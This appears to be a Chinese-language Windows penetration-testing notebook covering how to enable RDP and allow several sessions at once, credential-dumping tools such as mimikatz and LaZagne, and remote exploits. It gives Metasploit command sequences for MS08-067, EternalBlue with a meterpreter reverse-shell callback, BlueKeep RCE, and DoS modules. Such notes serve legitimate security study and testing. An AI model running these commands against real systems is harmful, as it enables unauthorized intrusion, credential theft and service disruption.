# windows 渗透笔记

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

# RDP

**cmd 开 RDP**
- 文章
    - [开启 RDP](https://b404.xyz/2017/12/27/open-RDP/)

- 命令
    - **dos 命令开启 3389 端口(开启 XP&2003 终端服务)**
        1. 方法一:`REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f`

        2. 方法二:`REG add HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /d 0 /t REG_DWORD /f`

    - **WMIC 开启 3389**

         `wmic /namespace:\\root\CIMV2\TerminalServices PATH Win32_TerminalServiceSetting WHERE (__CLASS !="") CALL SetAllowTSConnections 1`

    - **PowerShell 开启 RDP**
        1. Enable RDP
        `set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0`

        2. Allow RDP in firewall
        `Set-NetFirewallRule -Name RemoteDesktop-UserMode-In-TCP -Enabled true`

        3. Enable secure RDP authentication
        `set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1`

        或

        1. Enable Remote Desktop
        `(Get-WmiObject Win32_TerminalServiceSetting -Namespace root\cimv2\TerminalServices).SetAllowTsConnections(1,1) `
        `(Get-WmiObject -Class "Win32_TSGeneralSetting" -Namespace root\cimv2\TerminalServices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) `

        2. Enable the firewall rule
        `Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`

    - **查看 3389 端口是否开启**

        `REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /*如果是0x0则开启`

    - **更改终端端口为 2008(十六进制为:0x7d8)**

        1. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f`
        2. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x7D8 /f`

    - **查看 3389 端口是否更改**

        `REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber  /*出来的结果是 16 进制`

    - **取消 xp&2003 系统防火墙对终端服务的限制及 IP 连接的限制:**

        `REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@ xpsp2res.dll,-22009 /f`

**第三方连接工具**
- [rdesktop/rdesktop](https://github.com/rdesktop/rdesktop)
- [Remmina](https://remmina.org/)
- [FreeRDP/FreeRDP](https://github.com/FreeRDP/FreeRDP)

**多开**
- 文章
    - [Win7 双开 3389](https://blog.csdn.net/SysProgram/article/details/11810889)
    - [渗透技巧——Windows 系统远程桌面的多用户登录](https://www.4hou.com/system/8314.html)
    - [Multi-User login in Windows 7/Vista/XP using Remote Desktop](http://zahirkhan.com/tools-utilities/multi-user-login-in-windows-7)

- 工具
    - [stascorp/rdpwrap](https://github.com/stascorp/rdpwrap)

- mimikatz
    ```
    privilege::debug
    ts::multirdp
    ```

- Windows Server
    ```
    win+R
    gpedit.msc
    计算机配置->管理模板->Windows 组件->远程桌面服务->远程桌面会话主机->连接
    将 "将远程桌面服务的用户限制到单独的远程桌面会话" 禁用
    ```

**连接记录**
- 文章
    - [渗透技巧——获得 Windows 系统的远程桌面连接历史记录](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/)
    - [关于 windows 的 RDP 连接记录](http://rcoil.me/2018/05/%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95/)
    - [How to Clear RDP Connections History in Windows](http://woshub.com/how-to-clear-rdp-connections-history/#h2_3)

- 工具
    - [3gstudent/List-RDP-Connections-History](https://github.com/3gstudent/List-RDP-Connections-History)

---

# 口令获取及破解

**工具**
- [mimikatz](https://github.com/gentilkiwi/mimikatz) - 抓密码神器
    - [mimikatz笔记](../../工具/mimikatz笔记.md)
- [skelsec/pypykatz](https://github.com/skelsec/pypykatz) - 用纯 Python 实现的 Mimikatz
- [AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne) - 凭证抓取神器
- [Arvanaghi/SessionGopher](https://github.com/Arvanaghi/SessionGopher) - 使用 WMI 提取 WinSCP、PuTTY、SuperPuTTY、FileZilla 和 Microsoft remote Desktop 等远程访问工具保存的会话信息的 ps 脚本
- [Invoke-WCMDump](https://github.com/peewpw/Invoke-WCMDump) - 从 Credential Manager 中转储 Windows 凭证的 PowerShell 脚本
    ```
    set-executionpolicy remotesigned
    import-module .\Invoke-WCMDump.ps1
    invoke-wcmdump
    ```
- [SterJo Key Finder](https://www.sterjosoft.com/key-finder.html) - 找出系统中软件的序列号
- [uknowsec/SharpDecryptPwd](https://github.com/uknowsec/SharpDecryptPwd) - 对密码已保存在 Windwos 系统上的部分程序进行解析,包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品(Xshell,Xftp)。

**文章**
- [几种windows本地hash值获取和破解详解](https://www.secpulse.com/archives/65256.html)
- [Windows密码抓取总结](https://times0ng.github.io/2018/04/20/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/)
- [深刻理解windows安全认证机制](https://klionsec.github.io/2016/08/10/ntlm-kerberos/)
- [Windows用户密码的加密方法与破解](https://www.sqlsec.com/2019/11/winhash.html#toc-heading-2)
- [Windows下的密码hash——NTLM hash和Net-NTLM hash介绍](https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/)

**笔记**

关于 windows 认证更多知识点可见笔记 [认证](../../../运维/windows/笔记/认证.md)

---

# 漏洞利用

**资源**
- [SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits) - Windows 平台提权漏洞集合
- [WindowsExploits/Exploits](https://github.com/WindowsExploits/Exploits)- Windows Exploits

---

## 提权

关于 windows 更多提权内容,见笔记 [提权笔记](./提权笔记.md#win) windows 提权部分

---

## 远程
**MS08-067 & CVE-2008-4250**
- MSF 模块
    ```bash
    use exploit/windows/smb/ms08_067_netapi
    set payload windows/x64/meterpreter/reverse_tcp
    set target 0
    ```

**MS12-020 & CVE-2012-0002**
- MSF 模块
    ```bash
    use auxiliary/scanner/rdp/ms12_020_check
    use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
    ```

**MS14-066 & CVE-2014-6321**
- POC | Payload | exp
    - [anexia-it/winshock-test](https://github.com/anexia-it/winshock-test)

**MS15-034 & CVE-2015-1635**
- POC | Payload | exp
    - [MS15-034 Checker](https://pastebin.com/ypURDPc4)

- 文章
    - [MS15-034/CVE-2015-1635 HTTP远程代码执行漏洞分析](http://blogs.360.cn/post/cve_2015_6135_http_rce_analysis.html)

- MSF 模块
    ```bash
    use auxiliary/scanner/http/ms15_034_http_sys_memory_dump    # 读取服务器内存数据
    use auxiliary/dos/http/ms15_034_ulonglongadd    # 进行 dos 攻击
    ```

**MS17-010**
- MSF 模块
    ```bash
    # 发现,检测
    use auxiliary/scanner/smb/smb_ms17_010
    set rhosts <ip>
    run

    # 使用 payload 连上去
    use exploit/windows/smb/ms17_010_eternalblue
    set payload windows/x64/meterpreter/reverse_tcp
    set lhost <ip>      # 设置回弹地址
    set rhosts <ip>
    run

    # msf 下加载 mimikatz 模块
    load mimikatz
    kerberos
    ```

- 修复工具
    - ["永恒之蓝"勒索蠕虫漏洞修复工具](https://www.qianxin.com/other/wannacryfix)

**bluekeep & CVE-2019-0708**
- 文章
    - [RDP Stands for "Really DO Patch!" – Understanding the Wormable RDP Vulnerability CVE-2019-0708](https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/rdp-stands-for-really-do-patch-understanding-the-wormable-rdp-vulnerability-cve-2019-0708/)
    - [worawit/CVE-2019-0708](https://github.com/worawit/CVE-2019-0708/blob/master/NOTE.md)

- POC | Payload | exp
    - [zerosum0x0/CVE-2019-0708](https://github.com/zerosum0x0/CVE-2019-0708)
    - [robertdavidgraham/rdpscan](https://github.com/robertdavidgraham/rdpscan)
    - [Ekultek/BlueKeep](https://github.com/Ekultek/BlueKeep)
    - [mekhalleh/cve-2019-0708](https://github.com/mekhalleh/cve-2019-0708) (实测、蓝屏)
    - [Cyb0r9/ispy](https://github.com/Cyb0r9/ispy)
    - [k8gege/CVE-2019-0708](https://github.com/k8gege/CVE-2019-0708) - 批量检测工具

- 修复工具
    - ["CVE-2019-0708"漏洞检测修复工具](https://www.qianxin.com/other/CVE-2019-0708)
    - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708

- MSF 模块
    ```bash
    # 发现,检测
    use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
    set rhosts <ip>
    run
    ```
    ```bash
    # 利用
    use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
    set target <1-7>
    set rhosts <ip>
    show options
    exploit
    shell
    python
    ```

**CVE-2020-0796 微软 SMBv3 协议远程代码执行漏洞**
- 简介

    2020年3月11日，思科 Talos 发布了一个威胁等级被标记为 Critical 的 SMB 服务远程代码执行漏洞（CVE-2020-0796）综述，攻击者可以利用此漏洞远程无需用户验证通过发送构造特殊的恶意数据导致在目标系统上执行恶意代码，从而获取机器的完全控制。

    本次漏洞存在于微软 SMBv3.0 协议中，该漏洞是由 SMBv3 处理恶意压缩数据包时进入错误流程造成的。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。

- POC | Payload | exp
    - [ollypwn/SMBGhost](https://github.com/ollypwn/SMBGhost)

- 修复工具
    - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796

---

## 其他
**CVE-2018-8420 Msxml 解析器的远程代码执行漏洞**
- POC | Payload | exp
    - [Lz1y/CVE-2018-8420](https://github.com/Lz1y/CVE-2018-8420)

**CVE-2020-0601**
- POC | Payload | exp
    - [ollypwn/CVE-2020-0601](https://github.com/ollypwn/CVE-2020-0601)
    - [kudelskisecurity/chainoffools](https://github.com/kudelskisecurity/chainoffools)
